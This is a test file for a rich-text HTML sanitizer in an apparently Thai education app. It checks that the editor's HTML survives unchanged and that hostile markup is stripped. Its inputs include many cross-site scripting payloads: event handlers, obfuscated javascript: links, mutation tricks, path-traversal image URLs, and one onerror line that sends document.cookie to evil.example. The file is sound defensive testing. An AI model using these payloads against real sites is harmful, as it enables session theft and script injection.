import { afterEach, beforeEach, describe, it, expect, vi } from 'vitest'
import {
  isRichTextImageSrc, sanitizeRichTextForStorage, sanitizeRichTextHtml, type RichTextHtmlPolicy,
} from './rich-text-sanitize'
import { renderRichTextHtml } from './rich-text-html'
import { renderMathInHtml } from './math/latex'

const STORAGE = 'https://abcdefghijkl.supabase.co'
const PICTURE = `${STORAGE}/storage/v1/object/public/question-images/0b6c5d1e/solution-inline_1727243000000_k3j9x2ab.png`
const policy: RichTextHtmlPolicy = { storageOrigin: STORAGE, allowBlobImages: false }
const labPolicy: RichTextHtmlPolicy = { storageOrigin: STORAGE, allowBlobImages: true }

const clean = (html: string) => sanitizeRichTextHtml(html, policy)

/**
 * `html` cleaned — and checked to come out the same when cleaned again, since
 * a row stored clean is cleaned once more every time it is rendered.
 */
function cleaned(html: string): string {
  const once = clean(html)
  expect(clean(once)).toBe(once)
  return once
}

describe('sanitizeRichTextHtml — what the editor writes', () => {
  it('keeps the editor’s own HTML byte for byte', () => {
    const editorHtml = [
      '<p>ข้อความ <strong>หนา</strong> <em>เอียง</em> <u>ขีดเส้นใต้</u> <s>ขีดฆ่า</s> x<sup>2</sup> H<sub>2</sub>O</p>',
      '<p>บรรทัดแรก<br>บรรทัดสอง &amp; a &lt; b &gt; c&nbsp;d</p>',
      '<ul><li><p>หนึ่ง</p></li><li><p>สอง</p><ul><li><p>ย่อย</p></li></ul></li></ul>',
      '<ol start="3" type="a"><li><p>สาม</p></li></ol>',
      '<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://www.youtube.com/watch?v=abc&amp;t=10">ดูคลิป</a> และ <code>F = ma</code></p>',
      `<p>ดูรูป</p><img src="${PICTURE}" alt="" width="480" height="320"><p></p>`,
      '<p><b>b</b> <i>i</i> <span>span</span></p>',
      '<p>\\(v = u + at\\) และ \\[E = mc^2\\]</p>',
    ]
    for (const html of editorHtml) expect(cleaned(html)).toBe(html)
  })

  it('escapes stray text characters without touching character references', () => {
    expect(cleaned('x < 5 & y > 3')).toBe('x &lt; 5 &amp; y &gt; 3')
    expect(cleaned('<p>ราคา $5 · 25 &deg;C · 3 &times; 10<sup>8</sup> m/s</p>'))
      .toBe('<p>ราคา $5 · 25 &deg;C · 3 &times; 10<sup>8</sup> m/s</p>')
    expect(cleaned('<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>')).toBe('<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>')
    expect(cleaned('<p>AT&T &amp;lt;img src=x onerror=alert(1)&amp;gt;</p>'))
      .toBe('<p>AT&amp;T &amp;lt;img src=x onerror=alert(1)&amp;gt;</p>')
  })
})

describe('sanitizeRichTextHtml — script and event handlers', () => {
  it('drops script, style and their content', () => {
    expect(cleaned('<p>ก่อน</p><script>alert(1)</script><p>หลัง</p>')).toBe('<p>ก่อน</p><p>หลัง</p>')
    expect(cleaned('<SCRIPT SRC=//evil.example/x.js></SCRIPT><p>ok</p>')).toBe('<p>ok</p>')
    expect(cleaned('<style>p { display: none }</style><p>ok</p>')).toBe('<p>ok</p>')
    // Markup inside a script is never read as markup.
    expect(cleaned('<p>a<script>document.write("<p>x</p>")</script>b</p>')).toBe('<p>ab</p>')
    // A script left open swallows the rest, as it does in a browser.
    expect(cleaned('<p>ok</p><script>alert(1)')).toBe('<p>ok</p>')
  })

  it('drops every event handler, style, class and id', () => {
    expect(cleaned('<p onclick="alert(1)" style="color:red" class="x" id="y">ข้อความ</p>')).toBe('<p>ข้อความ</p>')
    expect(cleaned('<b onmouseover=alert(1)>หนา</b>')).toBe('<b>หนา</b>')
    expect(cleaned(`<img src="${PICTURE}" onerror="alert(1)" onload=alert(2) style="position:fixed;inset:0" class="x">`))
      .toBe(`<img src="${PICTURE}">`)
    expect(cleaned('<svg onload=alert(1)><circle r=5 /></svg>ok')).toBe('ok')
    expect(cleaned('<details open ontoggle=alert(1)>ok</details>')).toBe('ok')
    expect(cleaned('<body onload=alert(1)>ok</body>')).toBe('ok')
  })

  it('drops a picture whose source is not a real one, handler and all', () => {
    expect(cleaned('<img src=x onerror=alert(1)>')).toBe('')
    expect(cleaned('<p>ก่อน<img src="x" onerror="fetch(`//evil.example?c=${document.cookie}`)">หลัง</p>'))
      .toBe('<p>ก่อนหลัง</p>')
  })
})

describe('sanitizeRichTextHtml — links', () => {
  it('keeps web and e-mail links, with the target and rel Tiptap writes', () => {
    expect(cleaned('<a href="https://example.com/a?b=1" target="_self" rel="opener" onclick="alert(1)">ลิงก์</a>'))
      .toBe('<a target="_blank" rel="noopener noreferrer nofollow" href="https://example.com/a?b=1">ลิงก์</a>')
    expect(cleaned('<a href="mailto:kru@example.com">อีเมล</a>'))
      .toBe('<a target="_blank" rel="noopener noreferrer nofollow" href="mailto:kru@example.com">อีเมล</a>')
  })

  it('turns javascript:, data: and look-alike links into their words', () => {
    const hrefs = [
      'javascript:alert(1)',
      'JaVaScRiPt:alert(1)',
      ' javascript:alert(1)',
      'java\tscript:alert(1)',
      '\u0001javascript:alert(1)',
      '&#106;avascript:alert(1)',
      '&#x6A;avascript&#x3A;alert(1)',
      'jav&#x09;ascript:alert(1)',
      '&#0000106avascript:alert(1)',
      'javascript&colon;alert(1)',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      'vbscript:msgbox(1)',
      '//evil.example/x',
      'https://school.ac.th@evil.example/',
      'https://user:pass@evil.example/',
    ]
    for (const href of hrefs) {
      expect(cleaned(`<p><a href="${href}">คลิก</a></p>`)).toBe('<p>คลิก</p>')
    }
    expect(cleaned("<a href='javascript:alert(1)'>คลิก</a>")).toBe('คลิก')
    expect(cleaned('<a href=javascript:alert(1)>คลิก</a>')).toBe('คลิก')
  })
})

describe('sanitizeRichTextHtml — pictures', () => {
  it('keeps a picture from this project’s question-images bucket, with its size', () => {
    const picture = `<img src="${PICTURE}" alt="แรงบนพื้นเอียง &amp; มุม" width="480" height="320">`
    expect(cleaned(picture)).toBe(picture)
  })

  it('keeps width and height only as plain integers', () => {
    for (const width of ['100%', '480px', '1e3', ' 480', '-5', '480 onerror=alert(1)', '123456']) {
      expect(cleaned(`<img src="${PICTURE}" width="${width}" height="320">`)).toBe(`<img src="${PICTURE}" height="320">`)
    }
  })

  it('drops pictures from anywhere else', () => {
    const sources = [
      'https://evil.example/storage/v1/object/public/question-images/u1/a.png',
      `${STORAGE}.evil.example/storage/v1/object/public/question-images/u1/a.png`,
      `${STORAGE}/storage/v1/object/public/classroom-post-files/u1/a.png`,
      `${STORAGE}/storage/v1/object/public/question-images/../classroom-post-files/a.png`,
      `${STORAGE}/storage/v1/object/public/question-images/%2e%2e/classroom-post-files/a.png`,
      `${STORAGE}/storage/v1/object/public/question-images/u1%2F..%2F..%2Fother/a.png`,
      `${STORAGE}/storage/v1/object/sign/question-images/u1/a.png?token=x`,
      `${STORAGE}/storage/v1/object/public/question-images/u1/a.png?download=1`,
      `${STORAGE.replace('https:', 'http:')}/storage/v1/object/public/question-images/u1/a.png`,
      'data:image/png;base64,iVBORw0KGgo=',
      'data:image/svg+xml,<svg onload=alert(1)>',
      'javascript:alert(1)',
      'blob:https://korkru.example/5d2f7c8e-0000-4000-8000-000000000000',
      '',
    ]
    for (const src of sources) {
      expect(cleaned(`<p>ก่อน<img src="${src}" alt="x">หลัง</p>`)).toBe('<p>ก่อนหลัง</p>')
    }
  })

  it('keeps no picture at all when the project’s storage is not configured', () => {
    expect(sanitizeRichTextHtml(`<img src="${PICTURE}">`, { storageOrigin: null, allowBlobImages: false })).toBe('')
  })

  it('keeps a lab’s blob: picture only where the policy allows it', () => {
    const lab = '<img src="blob:http://localhost:3010/5d2f7c8e-0000-4000-8000-000000000000" alt="" width="200">'
    expect(sanitizeRichTextHtml(lab, labPolicy)).toBe(lab)
    expect(clean(lab)).toBe('')
  })

  it('answers the editor with the same rule it applies', () => {
    expect(isRichTextImageSrc(PICTURE, policy)).toBe(true)
    expect(isRichTextImageSrc('https://evil.example/storage/v1/object/public/question-images/u1/a.png', policy)).toBe(false)
    expect(isRichTextImageSrc('blob:http://localhost:3010/5d2f', policy)).toBe(false)
    expect(isRichTextImageSrc('blob:http://localhost:3010/5d2f', labPolicy)).toBe(true)
  })
})

describe('sanitizeRichTextHtml — nested and malformed markup', () => {
  it('never lets a trick come out as a live tag', () => {
    const tricks: Array<[string, string]> = [
      ['<scr<script>ipt>alert(1)</script>', 'ipt&gt;alert(1)'],
      ['<<img src=x onerror=alert(1)>', '&lt;'],
      ['<noscript><p title="</noscript><img src=x onerror=alert(1)>">', '"&gt;'],
      ['<svg><style><img src=x onerror=alert(1)></style></svg>', ''],
      ['<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>', ''],
      ['<!--><img src=x onerror=alert(1)>-->', '--&gt;'],
      ['<!-- <img src=x onerror=alert(1)> -->ok', 'ok'],
      ['<![CDATA[<img src=x onerror=alert(1)>]]>', ']]&gt;'],
      ['<?xml version="1.0"?><img src=x onerror=alert(1)>', ''],
      ['<template><img src=x onerror=alert(1)></template>ok', 'ok'],
      ['<textarea><img src=x onerror=alert(1)></textarea>ok', 'ok'],
      ['<title><img src=x onerror=alert(1)></title>ok', 'ok'],
      ['<iframe srcdoc="<script>alert(1)</script>"></iframe>ok', 'ok'],
      ['<object data="javascript:alert(1)">ok</object>', 'ok'],
      ['<embed src="javascript:alert(1)">ok', 'ok'],
      ['<base href="javascript:alert(1)//">ok', 'ok'],
      ['<meta http-equiv="refresh" content="0;url=javascript:alert(1)">ok', 'ok'],
      ['<form action="javascript:alert(1)"><button formaction="javascript:alert(1)">ok</button></form>', 'ok'],
      ['<p>ok<img src=x onerror=alert(1)', '<p>ok</p>'],
      ['<img/src=x/onerror=alert(1)>', ''],
      ['<img src="x" alt=">" onerror="alert(1)">', ''],
      ['<p title="<img src=x onerror=alert(1)>">ok</p>', '<p>ok</p>'],
      ['<a href="https://example.com/"><img src=x onerror=alert(1)>ลิงก์</a>',
        '<a target="_blank" rel="noopener noreferrer nofollow" href="https://example.com/">ลิงก์</a>'],
      ['<plaintext><img src=x onerror=alert(1)>', ''],
      ['<p>ok</p></p><img src=x onerror=alert(1)>', '<p>ok</p>'],
    ]
    for (const [input, expected] of tricks) {
      const output = cleaned(input)
      expect(output).toBe(expected)
      expect(output).not.toMatch(/<(?!\/?(?:p|a|b)\b)[a-z]/i)
    }
  })

  it('keeps an alt text that quotes markup inside its value', () => {
    expect(cleaned(`<img src="${PICTURE}" alt='" onerror="alert(1)'>`))
      .toBe(`<img src="${PICTURE}" alt="&quot; onerror=&quot;alert(1)">`)
    expect(cleaned(`<img src="${PICTURE}" alt="<script>alert(1)</script>">`))
      .toBe(`<img src="${PICTURE}" alt="&lt;script&gt;alert(1)&lt;/script&gt;">`)
  })

  it('closes what was left open and drops end tags with nothing to close', () => {
    expect(cleaned('<p><strong>ยังไม่ปิด')).toBe('<p><strong>ยังไม่ปิด</strong></p>')
    expect(cleaned('</p>ข้อความ</strong>')).toBe('ข้อความ')
    expect(cleaned('<p>a<p>b')).toBe('<p>a</p><p>b</p>')
    expect(cleaned('<ul><li>a<li>b</ul>')).toBe('<ul><li>a</li><li>b</li></ul>')
  })

  it('keeps the words of elements it does not know', () => {
    expect(cleaned('<font color=red>แดง</font> <custom-el onclick=alert(1)>ข้อความ</custom-el>')).toBe('แดง ข้อความ')
  })

  it('keeps a dropped block on its own line and a dropped cell apart from the next', () => {
    expect(cleaned('<div>บรรทัดหนึ่ง</div><div>บรรทัดสอง</div>')).toBe('บรรทัดหนึ่ง<br>บรรทัดสอง')
    expect(cleaned('<table><tr><td>t (s)</td><td>v (m/s)</td></tr><tr><td>0</td><td>2</td></tr></table>'))
      .toBe('t (s) v (m/s)<br>0 2')
    expect(cleaned('<h3>หัวข้อ</h3><p>เนื้อหา</p>')).toBe('หัวข้อ<p>เนื้อหา</p>')
  })

})

describe('renderRichTextHtml', () => {
  it('cleans before KaTeX, so the formula keeps its classes and styles', () => {
    const out = renderRichTextHtml('<p>\\(\\frac{1}{2}mv^2\\) <img src=x onerror=alert(1)></p>')
    expect(out).toContain('class="katex"')
    expect(out).toContain('<math')
    expect(out).toMatch(/style="height:/)
    expect(out).not.toContain('onerror')
    expect(out).not.toContain('\\(')
  })

  it('leaves TeX in a picture’s alt text as text', () => {
    const out = renderMathInHtml(clean(`<p><img src="${PICTURE}" alt="\\(x\\)"> \\(y\\)</p>`))
    expect(out).toContain(`<img src="${PICTURE}" alt="\\(x\\)">`)
    expect(out.match(/class="katex"/g)?.length).toBe(1)
  })

  it('does not let TeX make a link', () => {
    const out = renderRichTextHtml('\\(\\href{javascript:alert(1)}{x}\\)')
    expect(out).not.toMatch(/<a\b/)
    expect(out).not.toContain('href=')
  })

  it('handles null and undefined', () => {
    expect(renderRichTextHtml(null)).toBe('')
    expect(renderRichTextHtml(undefined)).toBe('')
  })
})

describe('sanitizeRichTextForStorage', () => {
  beforeEach(() => {
    vi.stubEnv('NEXT_PUBLIC_SUPABASE_URL', STORAGE)
  })
  afterEach(() => {
    vi.unstubAllEnvs()
  })

  it('stores text without a tag exactly as typed', () => {
    expect(sanitizeRichTextForStorage('x < 5 & y > 3')).toBe('x < 5 & y > 3')
    expect(sanitizeRichTextForStorage('')).toBe('')
  })

  it('stores the editor’s HTML unchanged', () => {
    const html = `<p>แรง <strong>F</strong> = ma &amp; a &lt; b</p><img src="${PICTURE}" alt="" width="480" height="320"><p></p>`
    expect(sanitizeRichTextForStorage(html)).toBe(html)
  })

  it('stores markup cleaned', () => {
    expect(sanitizeRichTextForStorage('<p>ok<img src=x onerror=alert(1)></p>')).toBe('<p>ok</p>')
  })

  it('never stores a blob: picture, even from a development build', () => {
    vi.stubEnv('NODE_ENV', 'development')
    expect(sanitizeRichTextForStorage('<p><img src="blob:http://localhost:3010/5d2f"></p>')).toBe('<p></p>')
  })

  it('keeps a paragraph around text whose tags were all dropped', () => {
    expect(sanitizeRichTextForStorage('<x-note>a &lt; b</x-note>')).toBe('<p>a &lt; b</p>')
  })
})
